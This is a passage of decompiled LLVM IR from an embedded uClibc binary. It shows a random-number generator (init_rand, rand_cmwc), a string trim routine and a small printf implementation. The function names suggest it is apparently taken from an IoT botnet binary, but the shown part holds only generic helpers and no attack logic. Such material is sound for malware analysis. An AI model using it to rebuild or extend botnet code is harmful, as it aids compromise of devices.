  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_2e440.6 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_2e020.9, { 1, 0 }
  uselistorder i8** @global_var_2e440.6, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  %v2_8150 = load i32, i32* @global_var_2e014.18, align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb2, label %bb3

bb2:                                              ; preds = %bb
  ret i32 ptrtoint (i32* @global_var_2e014.18 to i32)

bb3:                                              ; preds = %bb
  ret i32 ptrtoint (i32* @global_var_2e014.18 to i32)

; uselistorder directives
  uselistorder i32* @global_var_2e014.18, { 1, 0 }
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_130e4.22 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 127240, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @abort()
  ret i32 %v0_81bc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_81dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_81dc, i32* @global_var_2e474.25, align 4
  %v1_81fc = add i32 %v0_81dc, -1640531527
  store i32 %v1_81fc, i32* @global_var_2e478.26, align 4
  %v1_8218 = add i32 %v0_81dc, 1013904242
  store i32 %v1_8218, i32* @global_var_2e47c.27, align 4
  br label %dec_label_pc_8230

dec_label_pc_8230:                                ; preds = %entry, %dec_label_pc_8230
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_8274, %dec_label_pc_8230 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8240 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_2e474.25 to i32), i32 -12)
  %v6_8240 = inttoptr i32 %v5_8240 to i32*
  %v7_8240 = load i32, i32* %v6_8240, align 4
  %tmp9 = mul i32 %storemerge12, 4
  %v5_8250 = add i32 %tmp9, add (i32 ptrtoint (i32* @global_var_2e474.25 to i32), i32 -8)
  %v6_8250 = inttoptr i32 %v5_8250 to i32*
  %v7_8250 = load i32, i32* %v6_8250, align 4
  %v2_8254 = xor i32 %storemerge12, -1640531527
  %v2_825c = xor i32 %v2_8254, %v7_8240
  %v2_8264 = xor i32 %v2_825c, %v7_8250
  %v5_826c = mul nuw nsw i32 %storemerge12, 4
  %v6_826c = add i32 %v5_826c, ptrtoint (i32* @global_var_2e474.25 to i32)
  %v7_826c = inttoptr i32 %v6_826c to i32*
  store i32 %v2_8264, i32* %v7_826c, align 4
  %v1_8274 = add nuw nsw i32 %storemerge12, 1
  %v7_828c = icmp slt i32 %v1_8274, 4096
  br i1 %v7_828c, label %dec_label_pc_8230, label %dec_label_pc_8290

dec_label_pc_8290:                                ; preds = %dec_label_pc_8230
  %v9_8294 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8294

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8230, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %v2_82d0 = load i32, i32* @global_var_2e164.30, align 4
  %v1_82d4 = add i32 %v2_82d0, 1
  %v3_82dc = urem i32 %v1_82d4, 4096
  store i32 %v3_82dc, i32* @global_var_2e164.30, align 4
  %v4_82f4 = mul nuw nsw i32 %v3_82dc, 4
  %v5_82f4 = add i32 %v4_82f4, ptrtoint (i32* @global_var_2e474.25 to i32)
  %v6_82f4 = inttoptr i32 %v5_82f4 to i32*
  %v7_82f4 = load i32, i32* %v6_82f4, align 4
  %v2_830c = mul i32 %v7_82f4, 18782
  store i32 %v2_830c, i32* %r1.global-to-local, align 4
  %v2_8324 = load i32, i32* @global_var_2e160.33, align 4
  %v2_832c = add i32 %v2_8324, %v2_830c
  %v3_832c = icmp ult i32 %v2_832c, %v2_8324
  %v4_8330 = zext i1 %v3_832c to i32
  %v2_8360 = add i32 %v4_8330, %v2_832c
  %v3_8374 = icmp ult i32 %v2_8360, %v4_8330
  br i1 %v3_8374, label %dec_label_pc_837c, label %dec_label_pc_839c

dec_label_pc_837c:                                ; preds = %entry
  %v1_8380 = add i32 %v2_8360, 1
  %v1_8390 = select i1 %v3_832c, i32 2, i32 1
  br label %dec_label_pc_839c

dec_label_pc_839c:                                ; preds = %entry, %dec_label_pc_837c
  %storemerge = phi i32 [ %v1_8390, %dec_label_pc_837c ], [ %v4_8330, %entry ]
  %stack_var_-28.0 = phi i32 [ %v1_8380, %dec_label_pc_837c ], [ %v2_8360, %entry ]
  store i32 %storemerge, i32* @global_var_2e160.33, align 4
  store i32 %v3_82dc, i32* %r1.global-to-local, align 4
  %v2_83ac = sub i32 -2, %stack_var_-28.0
  store i32 %v2_83ac, i32* %v6_82f4, align 4
  %v1_83bc = load i32, i32* %r1.global-to-local, align 4
  %v4_83bc = mul i32 %v1_83bc, 4
  %v5_83bc = add i32 %v4_83bc, ptrtoint (i32* @global_var_2e474.25 to i32)
  %v6_83bc = inttoptr i32 %v5_83bc to i32*
  %v7_83bc = load i32, i32* %v6_83bc, align 4
  ret i32 %v7_83bc

; uselistorder directives
  uselistorder i32 %v4_8330, { 0, 2, 1 }
  uselistorder i32 %v2_8324, { 1, 0 }
  uselistorder i32 %v3_82dc, { 2, 1, 0 }
  uselistorder i32* @global_var_2e474.25, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2e474.25 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_839c, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i8*, align 4
  store i8* %arg1, i8** %stack_var_-32, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_83f8 = call i32 @strlen(i8* %arg1)
  store i32 %v3_83f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8418

dec_label_pc_8418:                                ; preds = %dec_label_pc_8418, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8410, %dec_label_pc_8418 ]
  %v3_8420 = load i8*, i8** %stack_var_-32, align 4
  %v4_8420 = ptrtoint i8* %v3_8420 to i32
  %v2_8424 = add i32 %v4_8420, %stack_var_-24.0
  %v1_8428 = inttoptr i32 %v2_8424 to i8*
  %v2_8428 = load i8, i8* %v1_8428, align 1
  %v3_8428 = zext i8 %v2_8428 to i32
  store i32 %v3_8428, i32* %r0.global-to-local, align 4
  %v1_8430 = call i32 @isspace(i32 %v3_8428)
  store i32 %v1_8430, i32* %r0.global-to-local, align 4
  %v2_8438 = icmp eq i32 %v1_8430, 0
  %v1_8410 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8438, label %dec_label_pc_8450.preheader, label %dec_label_pc_8418

dec_label_pc_8450.preheader:                      ; preds = %dec_label_pc_8418
  %v1_8400 = add i32 %v3_83f8, -1
  %v5_845c10 = icmp slt i32 %v1_8400, %stack_var_-24.0
  br i1 %v5_845c10, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8444:                                ; preds = %dec_label_pc_8460
  %v1_8448 = add i32 %stack_var_-20.011, -1
  %v5_845c = icmp slt i32 %v1_8448, %stack_var_-24.0
  br i1 %v5_845c, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8460:                                ; preds = %dec_label_pc_8450.preheader, %dec_label_pc_8444
  %stack_var_-20.011 = phi i32 [ %v1_8448, %dec_label_pc_8444 ], [ %v1_8400, %dec_label_pc_8450.preheader ]
  %v3_8468 = load i8*, i8** %stack_var_-32, align 4
  %v4_8468 = ptrtoint i8* %v3_8468 to i32
  %v2_846c = add i32 %v4_8468, %stack_var_-20.011
  %v1_8470 = inttoptr i32 %v2_846c to i8*
  %v2_8470 = load i8, i8* %v1_8470, align 1
  %v3_8470 = zext i8 %v2_8470 to i32
  store i32 %v3_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = call i32 @isspace(i32 %v3_8470)
  store i32 %v1_8478, i32* %r0.global-to-local, align 4
  %v2_8480 = icmp eq i32 %v1_8478, 0
  br i1 %v2_8480, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8444

dec_label_pc_84d0.preheader:                      ; preds = %dec_label_pc_8444, %dec_label_pc_8460, %dec_label_pc_8450.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8400, %dec_label_pc_8450.preheader ], [ %v1_8448, %dec_label_pc_8444 ], [ %stack_var_-20.011, %dec_label_pc_8460 ]
  br label %dec_label_pc_84d0

dec_label_pc_8494:                                ; preds = %dec_label_pc_84d0
  %v2_84b8 = add i32 %v4_84f0, %storemerge1
  %v1_84bc = inttoptr i32 %v2_84b8 to i8*
  %v2_84bc = load i8, i8* %v1_84bc, align 1
  %v3_84c0 = inttoptr i32 %v2_84f4 to i8*
  store i8 %v2_84bc, i8* %v3_84c0, align 1
  %v1_84c8 = add i32 %storemerge1, 1
  br label %dec_label_pc_84d0

dec_label_pc_84d0:                                ; preds = %dec_label_pc_84d0.preheader, %dec_label_pc_8494
  %storemerge1 = phi i32 [ %v1_84c8, %dec_label_pc_8494 ], [ %stack_var_-24.0, %dec_label_pc_84d0.preheader ]
  %v7_84dc = icmp sgt i32 %storemerge1, %stack_var_-20.0.lcssa
  %v2_84e8 = sub i32 %storemerge1, %stack_var_-24.0
  %v3_84f0 = load i8*, i8** %stack_var_-32, align 4
  %v4_84f0 = ptrtoint i8* %v3_84f0 to i32
  %v2_84f4 = add i32 %v4_84f0, %v2_84e8
  br i1 %v7_84dc, label %dec_label_pc_84e0, label %dec_label_pc_8494

dec_label_pc_84e0:                                ; preds = %dec_label_pc_84d0
  %v3_84fc = inttoptr i32 %v2_84f4 to i8*
  store i8 0, i8* %v3_84fc, align 1
  %v9_8504 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8504

; uselistorder directives
  uselistorder i32 %storemerge1, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8400, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8** %stack_var_-32, { 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_84d0, { 1, 0 }
  uselistorder label %dec_label_pc_84d0.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8460, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_8518 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8524 = icmp eq i32 %v0_8518, 0
  br i1 %v2_8524, label %dec_label_pc_8558, label %dec_label_pc_852c

dec_label_pc_852c:                                ; preds = %entry
  %v1_8530 = inttoptr i32 %v0_8518 to i32*
  %v2_8530 = load i32, i32* %v1_8530, align 4
  %v1_853c = trunc i32 %arg2 to i8
  %v3_853c = inttoptr i32 %v2_8530 to i8*
  store i8 %v1_853c, i8* %v3_853c, align 1
  %v2_8544 = load i32, i32* %v1_8530, align 4
  %v1_8548 = add i32 %v2_8544, 1
  store i32 %v1_8548, i32* %v1_8530, align 4
  %v9_8570.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_8558:                                ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v3_8568 = call i32 @__GI_write(i32 1, i32* nonnull %stack_var_-24)
  store i32 %v3_8568, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_856c:                                ; preds = %dec_label_pc_852c, %dec_label_pc_8558
  %v9_8570 = phi i32 [ %v9_8570.pre, %dec_label_pc_852c ], [ %v3_8568, %dec_label_pc_8558 ]
  ret i32 %v9_8570

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_856c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %v3_8578 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp41 = icmp slt i32 %arg3, 1
  br i1 %tmp41, label %dec_label_pc_8630, label %dec_label_pc_85b0

dec_label_pc_85b0:                                ; preds = %entry
  %v2_85e018 = load i8, i8* %arg2, align 1
  %v2_85e420 = icmp eq i8 %v2_85e018, 0
  br i1 %v2_85e420, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85c4:                                ; preds = %dec_label_pc_85b0, %dec_label_pc_85c4
  %v4_85dc22 = phi i32 [ %v1_85d4, %dec_label_pc_85c4 ], [ %tmp, %dec_label_pc_85b0 ]
  %stack_var_-40.021 = phi i32 [ %v1_85c8, %dec_label_pc_85c4 ], [ 0, %dec_label_pc_85b0 ]
  %v1_85c8 = add i32 %stack_var_-40.021, 1
  %v1_85d4 = add i32 %v4_85dc22, 1
  %v5_85d8 = inttoptr i32 %v1_85d4 to i8*
  %v2_85e0 = load i8, i8* %v5_85d8, align 1
  %v2_85e4 = icmp eq i8 %v2_85e0, 0
  br i1 %v2_85e4, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85ec:                                ; preds = %dec_label_pc_85c4, %dec_label_pc_85b0
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_85b0 ], [ %v1_85c8, %dec_label_pc_85c4 ]
  %v5_85f8 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_85f8, label %dec_label_pc_8608, label %dec_label_pc_8618

dec_label_pc_8608:                                ; preds = %dec_label_pc_85ec
  %v2_8610 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8618

dec_label_pc_8618:                                ; preds = %dec_label_pc_85ec, %dec_label_pc_8608
  %storemerge2 = phi i32 [ %v2_8610, %dec_label_pc_8608 ], [ 0, %dec_label_pc_85ec ]
  %v1_861c = and i32 %arg4, 2
  %v2_8620 = icmp eq i32 %v1_861c, 0
  br i1 %v2_8620, label %dec_label_pc_8630, label %dec_label_pc_8628

dec_label_pc_8628:                                ; preds = %dec_label_pc_8618
  br label %dec_label_pc_8630

dec_label_pc_8630:                                ; preds = %dec_label_pc_8618, %entry, %dec_label_pc_8628
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge2, %dec_label_pc_8618 ], [ %storemerge2, %dec_label_pc_8628 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8618 ], [ 48, %dec_label_pc_8628 ]
  %v1_8634 = urem i32 %arg4, 2
  %v2_8638 = icmp eq i32 %v1_8634, 0
  br i1 %v2_8638, label %dec_label_pc_8668.preheader, label %dec_label_pc_86a4.preheader

dec_label_pc_8668.preheader:                      ; preds = %dec_label_pc_8630
  %v5_867015 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_867015, label %dec_label_pc_8644.lr.ph, label %dec_label_pc_86a4.preheader

dec_label_pc_8644.lr.ph:                          ; preds = %dec_label_pc_8668.preheader
  %v2_864c = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8644

dec_label_pc_8644:                                ; preds = %dec_label_pc_8644.lr.ph, %dec_label_pc_8644
  %stack_var_-28.116 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8644.lr.ph ], [ %v1_8660, %dec_label_pc_8644 ]
  %v3_864c = call i32 @printchar(i32* %v2_864c, i32 %stack_var_-44.0)
  %v3_8650 = load i32, i32* %stack_var_-48, align 4
  %v1_8654 = add i32 %v3_8650, 1
  store i32 %v1_8654, i32* %stack_var_-48, align 4
  %v1_8660 = add nsw i32 %stack_var_-28.116, -1
  %v5_8670 = icmp sgt i32 %stack_var_-28.116, 1
  br i1 %v5_8670, label %dec_label_pc_8644, label %dec_label_pc_86a4.preheader

dec_label_pc_86a4.preheader:                      ; preds = %dec_label_pc_8644, %dec_label_pc_8668.preheader, %dec_label_pc_8630
  %v3_86e826 = phi i32 [ 0, %dec_label_pc_8630 ], [ 0, %dec_label_pc_8668.preheader ], [ %v1_8654, %dec_label_pc_8644 ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8630 ], [ %stack_var_-28.0, %dec_label_pc_8668.preheader ], [ 0, %dec_label_pc_8644 ]
  %v2_86a88 = load i8, i8* %arg2, align 1
  %v2_86ac10 = icmp eq i8 %v2_86a88, 0
  br i1 %v2_86ac10, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678.lr.ph

dec_label_pc_8678.lr.ph:                          ; preds = %dec_label_pc_86a4.preheader
  %v2_8688 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8678

dec_label_pc_8678:                                ; preds = %dec_label_pc_8678.lr.ph, %dec_label_pc_8678
  %v4_86a412 = phi i32 [ %tmp, %dec_label_pc_8678.lr.ph ], [ %v1_869c, %dec_label_pc_8678 ]
  %stack_var_-24.011 = phi i8* [ %arg2, %dec_label_pc_8678.lr.ph ], [ %v5_86a0, %dec_label_pc_8678 ]
  %v2_867c = load i8, i8* %stack_var_-24.011, align 1
  %v3_867c = zext i8 %v2_867c to i32
  %v3_8688 = call i32 @printchar(i32* %v2_8688, i32 %v3_867c)
  %v3_868c = load i32, i32* %stack_var_-48, align 4
  %v1_8690 = add i32 %v3_868c, 1
  store i32 %v1_8690, i32* %stack_var_-48, align 4
  %v1_869c = add i32 %v4_86a412, 1
  %v5_86a0 = inttoptr i32 %v1_869c to i8*
  %v2_86a8 = load i8, i8* %v5_86a0, align 1
  %v2_86ac = icmp eq i8 %v2_86a8, 0
  br i1 %v2_86ac, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678

dec_label_pc_86dc.preheader:                      ; preds = %dec_label_pc_8678, %dec_label_pc_86a4.preheader
  %v3_86e825 = phi i32 [ %v3_86e826, %dec_label_pc_86a4.preheader ], [ %v1_8690, %dec_label_pc_8678 ]
  %v5_86e45 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_86e45, label %dec_label_pc_86b8.lr.ph, label %dec_label_pc_86e8

dec_label_pc_86b8.lr.ph:                          ; preds = %dec_label_pc_86dc.preheader
  %v2_86c0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86b8

dec_label_pc_86b8:                                ; preds = %dec_label_pc_86b8.lr.ph, %dec_label_pc_86b8
  %stack_var_-28.36 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_86b8.lr.ph ], [ %v1_86d4, %dec_label_pc_86b8 ]
  %v3_86c0 = call i32 @printchar(i32* %v2_86c0, i32 %stack_var_-44.0)
  %v3_86c4 = load i32, i32* %stack_var_-48, align 4
  %v1_86c8 = add i32 %v3_86c4, 1
  store i32 %v1_86c8, i32* %stack_var_-48, align 4
  %v1_86d4 = add nsw i32 %stack_var_-28.36, -1
  %v5_86e4 = icmp sgt i32 %stack_var_-28.36, 1
  br i1 %v5_86e4, label %dec_label_pc_86b8, label %dec_label_pc_86e8

dec_label_pc_86e8:                                ; preds = %dec_label_pc_86b8, %dec_label_pc_86dc.preheader
  %v3_86e8 = phi i32 [ %v3_86e825, %dec_label_pc_86dc.preheader ], [ %v1_86c8, %dec_label_pc_86b8 ]
  store i32 %v3_8578, i32* @fp, align 4
  ret i32 %v3_86e8

; uselistorder directives
  uselistorder i32 %v1_869c, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_85d4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_86b8, { 1, 0 }
  uselistorder label %dec_label_pc_8678, { 1, 0 }
  uselistorder label %dec_label_pc_8644, { 1, 0 }
  uselistorder label %dec_label_pc_8630, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8618, { 1, 0 }
  uselistorder label %dec_label_pc_85c4, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_86fc = load i32, i32* @fp, align 4
  store i32 34564, i32* %stack_var_-4, align 4
  %v2_8700 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8700, i32* @fp, align 4
  %v1_8734 = icmp slt i32 %arg2, 0
  %v2_8734 = icmp eq i32 %arg2, 0
  br i1 %v2_8734, label %dec_label_pc_873c, label %dec_label_pc_8770

dec_label_pc_873c:                                ; preds = %entry
  store i32 48, i32* %stack_var_-28, align 4
  %v5_8760 = bitcast i32* %stack_var_-28 to i8*
  %v6_8760 = call i32 @prints(i32 %arg1, i8* %v5_8760, i32 %arg5, i32 %arg6, i32 0)
  br label %dec_label_pc_88d0

dec_label_pc_8770:                                ; preds = %entry
  %v2_8774 = icmp eq i32 %arg4, 0
  br i1 %v2_8774, label %dec_label_pc_87a8, label %dec_label_pc_877c

dec_label_pc_877c:                                ; preds = %dec_label_pc_8770
  %v7_8780 = icmp eq i32 %arg3, 10
  br i1 %v7_8780, label %dec_label_pc_8788, label %dec_label_pc_87a8

dec_label_pc_8788:                                ; preds = %dec_label_pc_877c
  br i1 %v1_8734, label %dec_label_pc_8794, label %dec_label_pc_87a8

dec_label_pc_8794:                                ; preds = %dec_label_pc_8788
  %v1_87a0 = sub i32 0, %arg2
  br label %dec_label_pc_87a8

dec_label_pc_87a8:                                ; preds = %dec_label_pc_8788, %dec_label_pc_877c, %dec_label_pc_8770, %dec_label_pc_8794
  %stack_var_-48.0 = phi i32 [ %arg2, %dec_label_pc_8770 ], [ %v1_87a0, %dec_label_pc_8794 ], [ %arg2, %dec_label_pc_8788 ], [ %arg2, %dec_label_pc_877c ]
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_8770 ], [ 1, %dec_label_pc_8794 ], [ 0, %dec_label_pc_8788 ], [ 0, %dec_label_pc_877c ]
  %tmp26 = bitcast i32* %stack_var_-17 to i8*
  store i8 0, i8* %tmp26, align 4
  %v2_883c4 = icmp eq i32 %stack_var_-48.0, 0
  br i1 %v2_883c4, label %dec_label_pc_8844, label %dec_label_pc_87c4.lr.ph

dec_label_pc_87c4.lr.ph:                          ; preds = %dec_label_pc_87a8
  %v1_87ec = add i32 %arg7, -58
  br label %dec_label_pc_87c4

dec_label_pc_87c4:                                ; preds = %dec_label_pc_87c4.lr.ph, %dec_label_pc_87fc
  %stack_var_-48.16 = phi i32 [ %stack_var_-48.0, %dec_label_pc_87c4.lr.ph ], [ %v2_882c, %dec_label_pc_87fc ]
  %stack_var_-64.05 = phi i8* [ %tmp26, %dec_label_pc_87c4.lr.ph ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_87d0 = urem i32 %stack_var_-48.16, %arg3
  %v7_87e4 = icmp slt i32 %v2_87d0, 10
  br i1 %v7_87e4, label %dec_label_pc_87fc, label %dec_label_pc_87e8

dec_label_pc_87e8:                                ; preds = %dec_label_pc_87c4
  %v2_87f4 = add i32 %v2_87d0, %v1_87ec
  br label %dec_label_pc_87fc

dec_label_pc_87fc:                                ; preds = %dec_label_pc_87c4, %dec_label_pc_87e8
  %stack_var_-60.0 = phi i32 [ %v2_87d0, %dec_label_pc_87c4 ], [ %v2_87f4, %dec_label_pc_87e8 ]
  %v4_87fc = ptrtoint i8* %stack_var_-64.05 to i32
  %v1_8800 = add i32 %v4_87fc, -1
  %v5_8804 = inttoptr i32 %v1_8800 to i8*
  %fold = add i32 %stack_var_-60.0, 48
  %v1_881c = trunc i32 %fold to i8
  store i8 %v1_881c, i8* %v5_8804, align 1
  %v2_882c = udiv i32 %stack_var_-48.16, %arg3
  %v2_883c = icmp ult i32 %stack_var_-48.16, %arg3
  br i1 %v2_883c, label %dec_label_pc_8844, label %dec_label_pc_87c4

dec_label_pc_8844:                                ; preds = %dec_label_pc_87fc, %dec_label_pc_87a8
  %stack_var_-64.0.lcssa = phi i8* [ %tmp26, %dec_label_pc_87a8 ], [ %v5_8804, %dec_label_pc_87fc ]
  %v2_8848 = icmp eq i32 %stack_var_-56.0, 0
  br i1 %v2_8848, label %dec_label_pc_88ac, label %dec_label_pc_8850

dec_label_pc_8850:                                ; preds = %dec_label_pc_8844
  %v3_8850 = load i32, i32* %stack_var_0, align 4
  %v2_8854 = icmp eq i32 %v3_8850, 0
  br i1 %v2_8854, label %dec_label_pc_8894, label %dec_label_pc_885c

dec_label_pc_885c:                                ; preds = %dec_label_pc_8850
  %v1_8860 = and i32 %arg6, 2
  %v2_8864 = icmp eq i32 %v1_8860, 0
  br i1 %v2_8864, label %dec_label_pc_8894, label %dec_label_pc_886c

dec_label_pc_886c:                                ; preds = %dec_label_pc_885c
  %v2_8874 = inttoptr i32 %arg1 to i32*
  %v3_8874 = call i32 @printchar(i32* %v2_8874, i32 45)
  %v3_8884 = load i32, i32* %stack_var_0, align 4
  %v1_8888 = add i32 %v3_8884, -1
  store i32 %v1_8888, i32* %stack_var_0, align 4
  br label %dec_label_pc_88ac

dec_label_pc_8894:                                ; preds = %dec_label_pc_885c, %dec_label_pc_8850
  %v4_8894 = ptrtoint i8* %stack_var_-64.0.lcssa to i32
  %v1_8898 = add i32 %v4_8894, -1
  %v5_889c = inttoptr i32 %v1_8898 to i8*
  store i8 45, i8* %v5_889c, align 1
  br label %dec_label_pc_88ac

dec_label_pc_88ac:                                ; preds = %dec_label_pc_8844, %dec_label_pc_886c, %dec_label_pc_8894
  %stack_var_-64.1 = phi i8* [ %stack_var_-64.0.lcssa, %dec_label_pc_8844 ], [ %v5_889c, %dec_label_pc_8894 ], [ %stack_var_-64.0.lcssa, %dec_label_pc_886c ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_8844 ], [ 0, %dec_label_pc_8894 ], [ 1, %dec_label_pc_886c ]
  %v3_88b4 = load i32, i32* %stack_var_0, align 4
  %v6_88bc = call i32 @prints(i32 %arg1, i8* %stack_var_-64.1, i32 %v3_88b4, i32 %arg6, i32 ptrtoint (i32* @0 to i32))
  %v2_88c8 = add i32 %v6_88bc, %stack_var_-52.0
  br label %dec_label_pc_88d0

dec_label_pc_88d0:                                ; preds = %dec_label_pc_873c, %dec_label_pc_88ac
  %storemerge2 = phi i32 [ %v2_88c8, %dec_label_pc_88ac ], [ %v6_8760, %dec_label_pc_873c ]
  store i32 %v3_86fc, i32* @fp, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8* %stack_var_-64.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_8804, { 0, 2, 1 }
  uselistorder i32 %v2_87d0, { 1, 0, 2 }
  uselistorder i32 %stack_var_-48.16, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_88d0, { 1, 0 }
  uselistorder label %dec_label_pc_88ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_87fc, { 1, 0 }
  uselistorder label %dec_label_pc_87c4, { 1, 0 }
  uselistorder label %dec_label_pc_87a8, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-18 = alloca i32, align 4
